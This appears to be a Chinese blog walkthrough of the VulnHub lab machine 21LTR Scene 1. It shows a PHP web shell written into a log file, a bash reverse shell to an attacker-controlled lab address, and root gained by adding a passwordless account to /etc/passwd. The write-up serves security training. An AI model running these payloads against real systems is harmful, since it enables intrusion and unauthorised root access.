@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>vulnhub: WALKTHROUGH: 21LTR_SCENE_1 - Vampire blog</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta itemprop="name" content="vulnhub: WALKTHROUGH: 21LTR_SCENE_1">
+<meta itemprop="description" content="靶机介绍 这是一个很老的靶机了，也是boot2root类型靶机，由于年代久远，我以为会很简单，但是感觉还是自己练习的比较少。。。 靶机下载地址： https://www.vulnhub.com/entry/21ltr-scene-1,3/
+靶机运行 下载完成后，使用VMware虚拟机安装镜像，虚拟机无法检测此光盘镜像中的操作系统，手动选择系统选Ubuntu就好，安装完成后会显示靶机地址为192.168.2.120，看起来不能更改
+不通的话只能手动修改虚拟机配置了，由于靶机练习不需要上网，直接使用仅主机模式就好，在选之前需要配置一下虚拟机的网卡设置，选择编辑点击虚拟网络编辑器
+点击更改设置将子网IP改为192.168.2.0，这样同样使用仅主机的虚拟机就可以互相通信了
+信息收集 首先拿出nmap，扫描一下端口 nmap -p 1-65535 192.168.2.120 得到结果(运气好可能会发现其他端口)
+先访问80看看有什么东西
+没看出来什么。。。没事查看一下源码吧
+拿到密码，登录尝试发现密码为FTP服务账号密码，登录查看内容
+点击查看该文件内容
+看起来是个写错误日志的文件，查看一下源码
+暂时不知道有什么用 还是先扫扫目录吧 直接使用dirb http://192.168.2.120
+发现logs路径，把刚才发现的php文件名拼接访问一下试试 http://192.168.2.120/logs/backup_log.php
+漏洞利用 思路大概可能是想办法将木马写入到日志文件中，但是不知道怎么继续。。查了一下别人的做法，需要向10001端口发送数据，可是为什么我扫描不到这个端口。 仔细查看了一下日志发现有个目标地址192.168.2.240，先把自己的靶机配置为该地址 使用命令临时配置IP，ifconfig eth0 192.168.2.240 netmask 255.255.255.0，图形化界面的kali可能需要在网络配置处更改一下ip
+前面都准备好了，那就拿出wireshark抓包监听吧，等了好久好久（可能我刚好错过时间），发现192.168.2.120服务器会向192.168.2.240的10000端口发送数据
+可能是定时任务，开启nc -lkvvp 10000进行监听，等待继续抓包，又等了好久好久发现每隔十分钟就会向192.168.2.240服务器发送数据
+看到收到数据包，不知道是些什么东西
+迅速开启nmap全端口扫描，啊。。。终于抓到你了
+这会使用nc 或者telnet进行连接192.168.2.120 的10001端口 这个时候刚好10001端口开放直接使用 telnet 192.168.2.120 10001端口，连接成功后输入&lt;?php system($_GET[&#39;cmd&#39;]) ?&gt;,然后回车就会写入到文件中 如果刚好错过了端口开放的时间，为了不需要一直盯着靶机看，可以使用nc -lvvp 10000 &gt; file &amp;&amp; nc -nv 192.168.2.120 10001&lt; 1.txt 这个命令 1.txt里面保存的是小马
+等待十分钟= =
+收到数据包，查看ftp://192.168.2.120/backup_log.php的源码文件,写入成功
+访问http://192.168.2.120/logs/backup_log.php?cmd=id
+获取反弹shell 首先使用 nc -nvlp 8080 然后访问http://192.">
+<meta itemprop="datePublished" content="2019-11-04T20:48:28&#43;08:00" />
+<meta itemprop="dateModified" content="2019-11-04T20:48:28&#43;08:00" />
+<meta itemprop="wordCount" content="108">
+
+
+
+<meta itemprop="keywords" content="boot2root," /><meta property="og:title" content="vulnhub: WALKTHROUGH: 21LTR_SCENE_1" />
+<meta property="og:description" content="靶机介绍 这是一个很老的靶机了，也是boot2root类型靶机，由于年代久远，我以为会很简单，但是感觉还是自己练习的比较少。。。 靶机下载地址： https://www.vulnhub.com/entry/21ltr-scene-1,3/
+靶机运行 下载完成后，使用VMware虚拟机安装镜像，虚拟机无法检测此光盘镜像中的操作系统，手动选择系统选Ubuntu就好，安装完成后会显示靶机地址为192.168.2.120，看起来不能更改
+不通的话只能手动修改虚拟机配置了，由于靶机练习不需要上网，直接使用仅主机模式就好，在选之前需要配置一下虚拟机的网卡设置，选择编辑点击虚拟网络编辑器
+点击更改设置将子网IP改为192.168.2.0，这样同样使用仅主机的虚拟机就可以互相通信了
+信息收集 首先拿出nmap，扫描一下端口 nmap -p 1-65535 192.168.2.120 得到结果(运气好可能会发现其他端口)
+先访问80看看有什么东西
+没看出来什么。。。没事查看一下源码吧
+拿到密码，登录尝试发现密码为FTP服务账号密码，登录查看内容
+点击查看该文件内容
+看起来是个写错误日志的文件，查看一下源码
+暂时不知道有什么用 还是先扫扫目录吧 直接使用dirb http://192.168.2.120
+发现logs路径，把刚才发现的php文件名拼接访问一下试试 http://192.168.2.120/logs/backup_log.php
+漏洞利用 思路大概可能是想办法将木马写入到日志文件中，但是不知道怎么继续。。查了一下别人的做法，需要向10001端口发送数据，可是为什么我扫描不到这个端口。 仔细查看了一下日志发现有个目标地址192.168.2.240，先把自己的靶机配置为该地址 使用命令临时配置IP，ifconfig eth0 192.168.2.240 netmask 255.255.255.0，图形化界面的kali可能需要在网络配置处更改一下ip
+前面都准备好了，那就拿出wireshark抓包监听吧，等了好久好久（可能我刚好错过时间），发现192.168.2.120服务器会向192.168.2.240的10000端口发送数据
+可能是定时任务，开启nc -lkvvp 10000进行监听，等待继续抓包，又等了好久好久发现每隔十分钟就会向192.168.2.240服务器发送数据
+看到收到数据包，不知道是些什么东西
+迅速开启nmap全端口扫描，啊。。。终于抓到你了
+这会使用nc 或者telnet进行连接192.168.2.120 的10001端口 这个时候刚好10001端口开放直接使用 telnet 192.168.2.120 10001端口，连接成功后输入&lt;?php system($_GET[&#39;cmd&#39;]) ?&gt;,然后回车就会写入到文件中 如果刚好错过了端口开放的时间，为了不需要一直盯着靶机看，可以使用nc -lvvp 10000 &gt; file &amp;&amp; nc -nv 192.168.2.120 10001&lt; 1.txt 这个命令 1.txt里面保存的是小马
+等待十分钟= =
+收到数据包，查看ftp://192.168.2.120/backup_log.php的源码文件,写入成功
+访问http://192.168.2.120/logs/backup_log.php?cmd=id
+获取反弹shell 首先使用 nc -nvlp 8080 然后访问http://192." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://vampire-lab.github.io/posts/21ltr_scene_1/" />
+<meta property="article:published_time" content="2019-11-04T20:48:28+08:00" />
+<meta property="article:modified_time" content="2019-11-04T20:48:28+08:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="vulnhub: WALKTHROUGH: 21LTR_SCENE_1"/>
+<meta name="twitter:description" content="靶机介绍 这是一个很老的靶机了，也是boot2root类型靶机，由于年代久远，我以为会很简单，但是感觉还是自己练习的比较少。。。 靶机下载地址： https://www.vulnhub.com/entry/21ltr-scene-1,3/
+靶机运行 下载完成后，使用VMware虚拟机安装镜像，虚拟机无法检测此光盘镜像中的操作系统，手动选择系统选Ubuntu就好，安装完成后会显示靶机地址为192.168.2.120，看起来不能更改
+不通的话只能手动修改虚拟机配置了，由于靶机练习不需要上网，直接使用仅主机模式就好，在选之前需要配置一下虚拟机的网卡设置，选择编辑点击虚拟网络编辑器
+点击更改设置将子网IP改为192.168.2.0，这样同样使用仅主机的虚拟机就可以互相通信了
+信息收集 首先拿出nmap，扫描一下端口 nmap -p 1-65535 192.168.2.120 得到结果(运气好可能会发现其他端口)
+先访问80看看有什么东西
+没看出来什么。。。没事查看一下源码吧
+拿到密码，登录尝试发现密码为FTP服务账号密码，登录查看内容
+点击查看该文件内容
+看起来是个写错误日志的文件，查看一下源码
+暂时不知道有什么用 还是先扫扫目录吧 直接使用dirb http://192.168.2.120
+发现logs路径，把刚才发现的php文件名拼接访问一下试试 http://192.168.2.120/logs/backup_log.php
+漏洞利用 思路大概可能是想办法将木马写入到日志文件中，但是不知道怎么继续。。查了一下别人的做法，需要向10001端口发送数据，可是为什么我扫描不到这个端口。 仔细查看了一下日志发现有个目标地址192.168.2.240，先把自己的靶机配置为该地址 使用命令临时配置IP，ifconfig eth0 192.168.2.240 netmask 255.255.255.0，图形化界面的kali可能需要在网络配置处更改一下ip
+前面都准备好了，那就拿出wireshark抓包监听吧，等了好久好久（可能我刚好错过时间），发现192.168.2.120服务器会向192.168.2.240的10000端口发送数据
+可能是定时任务，开启nc -lkvvp 10000进行监听，等待继续抓包，又等了好久好久发现每隔十分钟就会向192.168.2.240服务器发送数据
+看到收到数据包，不知道是些什么东西
+迅速开启nmap全端口扫描，啊。。。终于抓到你了
+这会使用nc 或者telnet进行连接192.168.2.120 的10001端口 这个时候刚好10001端口开放直接使用 telnet 192.168.2.120 10001端口，连接成功后输入&lt;?php system($_GET[&#39;cmd&#39;]) ?&gt;,然后回车就会写入到文件中 如果刚好错过了端口开放的时间，为了不需要一直盯着靶机看，可以使用nc -lvvp 10000 &gt; file &amp;&amp; nc -nv 192.168.2.120 10001&lt; 1.txt 这个命令 1.txt里面保存的是小马
+等待十分钟= =
+收到数据包，查看ftp://192.168.2.120/backup_log.php的源码文件,写入成功
+访问http://192.168.2.120/logs/backup_log.php?cmd=id
+获取反弹shell 首先使用 nc -nvlp 8080 然后访问http://192."/>
+<link href='https://fonts.googleapis.com/css?family=Playfair+Display:700' rel='stylesheet' type='text/css'>
+	<link rel="stylesheet" type="text/css" media="screen" href="https://vampire-lab.github.io/css/normalize.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="https://vampire-lab.github.io/css/main.css" />
+
+        <link id="dark-scheme" rel="stylesheet" type="text/css" href="https://vampire-lab.github.io/css/dark.css" />
+
+	<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+		<script src="https://vampire-lab.github.io/js/main.js"></script>
+</head>
+
+<body>
+	<div class="container wrapper">
+		<div class="header">
+	
+		<div class="avatar">
+			<a href="https://vampire-lab.github.io/">
+				<img src="/images/im/t.png" alt="Vampire blog" />
+			</a>
+		</div>
+	
+	<h1 class="site-title"><a href="https://vampire-lab.github.io/">Vampire blog</a></h1>
+	<div class="site-description"><p>不去想是否能够成功,既然选择了远方,便只顾风雨兼程。</p><nav class="nav social">
+			<ul class="flat"><li><a href="https://github.com/vampire-lab" title="Github"><i data-feather="github"></i></a></li><li><a href="/index.xml" title="RSS"><i data-feather="rss"></i></a></li></ul>
+		</nav><span class="scheme-toggle"><a href="#" id="scheme-toggle"></a></div>
+
+	<nav class="nav">
+		<ul class="flat">
+			
+			<li>
+				<a href="/">Home</a>
+			</li>
+			
+			<li>
+				<a href="/posts">All posts</a>
+			</li>
+			
+			<li>
+				<a href="/about">About</a>
+			</li>
+			
+			<li>
+				<a href="/tags">Tags</a>
+			</li>
+			
+		</ul>
+	</nav>
+</div>
+
+
+		<div class="post">
+			<div class="post-header">
+				
+					<div class="meta">
+						<div class="date">
+							<span class="day">04</span>
+							<span class="rest">Nov 2019</span>
+						</div>
+					</div>
+				
+				<div class="matter">
+					<h1 class="title">vulnhub: WALKTHROUGH: 21LTR_SCENE_1</h1>
+				</div>
+			</div>
+					
+			<div class="markdown">
+				<h3 id="靶机介绍">靶机介绍</h3>
+<p>这是一个很老的靶机了，也是boot2root类型靶机，由于年代久远，我以为会很简单，但是感觉还是自己练习的比较少。。。
+靶机下载地址：
+<code>https://www.vulnhub.com/entry/21ltr-scene-1,3/</code></p>
+<h3 id="靶机运行">靶机运行</h3>
+<p>下载完成后，使用VMware虚拟机安装镜像，虚拟机无法检测此光盘镜像中的操作系统，手动选择系统选Ubuntu就好，安装完成后会显示靶机地址为192.168.2.120，看起来不能更改</p>
+<p><img src="/images/2019/21LTR_SCENE_1/dac1d8ed9dd8b82d838698cbac35570f.png" alt="dac1d8ed9dd8b82d838698cbac35570f.png"></p>
+<p>不通的话只能手动修改虚拟机配置了，由于靶机练习不需要上网，直接使用仅主机模式就好，在选之前需要配置一下虚拟机的网卡设置，选择编辑点击虚拟网络编辑器</p>
+<p><img src="/images/2019/21LTR_SCENE_1/64e0abc64e070675fb1223e160922e5c.png" alt="64e0abc64e070675fb1223e160922e5c.png"></p>
+<p>点击更改设置将子网IP改为192.168.2.0，这样同样使用仅主机的虚拟机就可以互相通信了</p>
+<p><img src="/images/2019/21LTR_SCENE_1/32cba17029d9ce5abdb66d5bc10aff9d.png" alt="32cba17029d9ce5abdb66d5bc10aff9d.png"></p>
+<h3 id="信息收集">信息收集</h3>
+<p>首先拿出nmap，扫描一下端口
+nmap -p 1-65535 192.168.2.120 得到结果(运气好可能会发现其他端口)</p>
+<p><img src="/images/2019/21LTR_SCENE_1/0bda5f72256b55615d737355a1f699be.png" alt="0bda5f72256b55615d737355a1f699be.png"></p>
+<p>先访问80看看有什么东西</p>
+<p><img src="/images/2019/21LTR_SCENE_1/b64bd30cc2005bf199c0138f77578112.png" alt="b64bd30cc2005bf199c0138f77578112.png"></p>
+<p>没看出来什么。。。没事查看一下源码吧</p>
+<p><img src="/images/2019/21LTR_SCENE_1/3da009b3aadb8aee9a2cf855ffaa7222.png" alt="3da009b3aadb8aee9a2cf855ffaa7222.png"></p>
+<p>拿到密码，登录尝试发现密码为FTP服务账号密码，登录查看内容</p>
+<p><img src="/images/2019/21LTR_SCENE_1/7085e8dd6c94f4e878cbff9c03982866.png" alt="7085e8dd6c94f4e878cbff9c03982866.png"></p>
+<p>点击查看该文件内容</p>
+<p><img src="/images/2019/21LTR_SCENE_1/3c1282aedfd3079edc29ee2a819f032b.png" alt="3c1282aedfd3079edc29ee2a819f032b.png"></p>
+<p>看起来是个写错误日志的文件，查看一下源码</p>
+<p><img src="/images/2019/21LTR_SCENE_1/5ba9032a27d97e621a4b4bb36f07d363.png" alt="5ba9032a27d97e621a4b4bb36f07d363.png"></p>
+<p>暂时不知道有什么用
+还是先扫扫目录吧
+直接使用<code>dirb http://192.168.2.120</code></p>
+<p><img src="/images/2019/21LTR_SCENE_1/4869947c5a0b8b0c8cd1ba298f694481.png" alt="4869947c5a0b8b0c8cd1ba298f694481.png"></p>
+<p>发现logs路径，把刚才发现的php文件名拼接访问一下试试
+<code>http://192.168.2.120/logs/backup_log.php</code></p>
+<p><img src="/images/2019/21LTR_SCENE_1/e6bf56bb2ad8e5ae1e97712fa0be2202.png" alt="e6bf56bb2ad8e5ae1e97712fa0be2202.png"></p>
+<h3 id="漏洞利用">漏洞利用</h3>
+<p>思路大概可能是想办法将木马写入到日志文件中，但是不知道怎么继续。。查了一下别人的做法，需要向<code>10001</code>端口发送数据，可是为什么我扫描不到这个端口。
+仔细查看了一下日志发现有个目标地址<code>192.168.2.240</code>，先把自己的靶机配置为该地址
+使用命令临时配置IP，<code>ifconfig eth0 192.168.2.240 netmask 255.255.255.0</code>，图形化界面的kali可能需要在网络配置处更改一下ip</p>
+<p>前面都准备好了，那就拿出wireshark抓包监听吧，等了好久好久（可能我刚好错过时间），发现<code>192.168.2.120</code>服务器会向<code>192.168.2.240</code>的<code>10000</code>端口发送数据</p>
+<p><img src="/images/2019/21LTR_SCENE_1/77fb5341f4ad49be7085056a4cf8c7b7.png" alt="77fb5341f4ad49be7085056a4cf8c7b7.png"></p>
+<p>可能是定时任务，开启<code>nc -lkvvp 10000</code>进行监听，等待继续抓包，又等了好久好久发现每隔十分钟就会向<code>192.168.2.240</code>服务器发送数据</p>
+<p><img src="/images/2019/21LTR_SCENE_1/d42244513d546b40a777a86d84f90f12.png" alt="d42244513d546b40a777a86d84f90f12.png"></p>
+<p>看到收到数据包，不知道是些什么东西</p>
+<p><img src="/images/2019/21LTR_SCENE_1/9d0059fdb6df7131b84695df65957160.png" alt="9d0059fdb6df7131b84695df65957160.png"></p>
+<p>迅速开启nmap全端口扫描，啊。。。终于抓到你了</p>
+<p><img src="/images/2019/21LTR_SCENE_1/33a0bd2b297edf1ae7014f8aef5daf7b.png" alt="33a0bd2b297edf1ae7014f8aef5daf7b.png"></p>
+<p>这会使用nc 或者telnet进行连接192.168.2.120 的10001端口
+这个时候刚好10001端口开放直接使用 telnet 192.168.2.120 10001端口，连接成功后输入<code>&lt;?php system($_GET['cmd']) ?&gt;</code>,然后回车就会写入到文件中
+如果刚好错过了端口开放的时间，为了不需要一直盯着靶机看，可以使用<code>nc -lvvp 10000 &gt; file &amp;&amp; nc -nv  192.168.2.120 10001&lt; 1.txt </code>这个命令
+1.txt里面保存的是小马</p>
+<p><img src="/images/2019/21LTR_SCENE_1/7937b4d3745b091359373dc54546e19c.png" alt="7937b4d3745b091359373dc54546e19c.png"></p>
+<p>等待十分钟= =</p>
+<p><img src="/images/2019/21LTR_SCENE_1/a0dd76afd37e5a1a84d88abe7e580ec0.png" alt="a0dd76afd37e5a1a84d88abe7e580ec0.png"></p>
+<p>收到数据包，查看<code>ftp://192.168.2.120/backup_log.php</code>的源码文件,写入成功</p>
+<p><img src="/images/2019/21LTR_SCENE_1/0790202c212350d3e92beca3dfc8961d.png" alt="0790202c212350d3e92beca3dfc8961d.png"></p>
+<p>访问http://192.168.2.120/logs/backup_log.php?cmd=id</p>
+<p><img src="/images/2019/21LTR_SCENE_1/318eee5b4184d39f7845a1cb70c53b81.png" alt="318eee5b4184d39f7845a1cb70c53b81.png"></p>
+<p>获取反弹shell
+首先使用 nc -nvlp 8080
+然后访问http://192.168.2.120/logs/backup_log.php?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.240%2F8080%200%3E%261
+反弹成功</p>
+<p><img src="/images/2019/21LTR_SCENE_1/197071e83be55953eaa979f799592c4d.png" alt="197071e83be55953eaa979f799592c4d.png"></p>
+<h3 id="提权">提权</h3>
+<p>进入系统翻看有用的内容。。感觉这个就靠找了
+翻到一个秘钥文件
+<code>/media/USB_1/Stuff/Keys</code></p>
+<p><img src="/images/2019/21LTR_SCENE_1/01ae055b28aaaa62677c00e556f08cfc.png" alt="01ae055b28aaaa62677c00e556f08cfc.png"></p>
+<p>路径下还有个一个<code>authorized_keys</code>，查看内容<code>cat authorized_keys</code></p>
+<p><img src="/images/2019/21LTR_SCENE_1/b525ff48810a76156d768509d0f5d849.png" alt="b525ff48810a76156d768509d0f5d849.png"></p>
+<p>该秘钥用户名应该是<code>hbeale</code>，尝试登陆
+将秘钥复制到文本中，执行命令 <code>ssh -i key hbeale@192.168.2.120</code>
+如果出现如下提示</p>
+<p><img src="/images/2019/21LTR_SCENE_1/8c9bc9ecba1a338a46b3d4483ba85325.png" alt="8c9bc9ecba1a338a46b3d4483ba85325.png"></p>
+<p>可能是因为秘钥的权限较高，应设置为其他用户不可读，执行 <code>chmod 600 xxx</code>给秘钥可读可写权限</p>
+<p><img src="/images/2019/21LTR_SCENE_1/97d8524355ce0335048aed19bd932ded.png" alt="97d8524355ce0335048aed19bd932ded.png"></p>
+<p>然后再执行<code>ssh -i key hbeale@192.168.2.120</code>，登陆成功</p>
+<p><img src="/images/2019/21LTR_SCENE_1/084e9fe00f9fb75b686bd63c2adb2498.png" alt="084e9fe00f9fb75b686bd63c2adb2498.png"></p>
+<p>使用命令<code>sudo -l</code>
+<img src="/images/2019/21LTR_SCENE_1/f40a8979d82538ec99fb30cb14bfd619.png" alt="f40a8979d82538ec99fb30cb14bfd619.png"></p>
+<p>得知<code>/usr/bin/cat</code> 使用<code>sudo</code>命令不需要密码
+我们使用该命令为系统添加一个<code>root</code>权限用户
+<code>sudo /usr/bin/cat &gt;&gt; /etc/passwd</code>
+<code>vampire::0:0::/root:/bin/bash</code></p>
+<p><img src="/images/2019/21LTR_SCENE_1/791fae13efdc9bf7c2bb5cb73072a270.png" alt="791fae13efdc9bf7c2bb5cb73072a270.png"></p>
+<p>添加成功尝试登陆
+执行su vampire</p>
+<p><img src="/images/2019/21LTR_SCENE_1/af4a7c718e730ed0b84f932340a912fd.png" alt="af4a7c718e730ed0b84f932340a912fd.png"></p>
+<p>成功获取root权限</p>
+
+			</div>
+
+			<div class="tags">
+				
+					
+						<ul class="flat">
+							
+							<li><a href="/tags/boot2root">boot2root</a></li>
+							
+						</ul>
+					
+				
+			</div>
+
+
+		</div>
+	</div>
+	<div class="footer wrapper">
+	<nav class="nav">
+		<div>2019  © Copyright notice |  <a href="https://github.com/knadh/hugo-ink">Ink</a> theme on <a href="https://gohugo.io">Hugo</a></div>
+	</nav>
+</div>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-123-45', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+<script>feather.replace()</script>
+</body>
+</html>
